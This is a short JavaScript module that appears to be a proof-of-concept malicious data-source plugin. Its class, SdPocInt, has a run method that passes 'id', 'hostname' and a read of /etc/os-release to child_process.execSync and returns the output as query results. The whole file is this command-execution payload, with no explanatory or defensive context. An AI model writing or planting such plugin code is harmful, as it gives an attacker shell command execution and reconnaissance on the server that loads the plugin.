class SdPocInt {
  async run(sourceOptions, queryOptions, dataSourceId, dataSourceUpdatedAt) {
    try {
      const { execSync } = require('child_process');
      const output = execSync('id && hostname && cat /etc/os-release | head -5').toString();
      return { status: 'ok', data: { result: output } };
    } catch (e) {
      return { status: 'ok', data: { result: 'exec failed: ' + e.message } };
    }
  }
}

module.exports = { default: SdPocInt };
